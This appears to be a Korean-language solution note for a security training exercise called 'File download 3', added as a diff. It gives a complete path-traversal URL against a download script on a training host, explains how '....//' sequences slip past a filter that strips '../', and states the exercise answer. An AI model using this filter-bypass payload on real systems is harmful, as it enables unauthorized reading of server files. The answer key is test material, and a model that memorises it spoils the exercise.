@@ -1,0 +1,11 @@
+파일 다운로드 3번
+
+필터링: ../
+
+1. 공격 URL : https://elms2.skinfosec.co.kr:8087/exam27/down/download2.php?file_path=./....//....//....//....//....//....//....//....//....//....//answer2/down.txt
+
+....//로 ../ 우회
+
+2. 정답
+
+file_filter
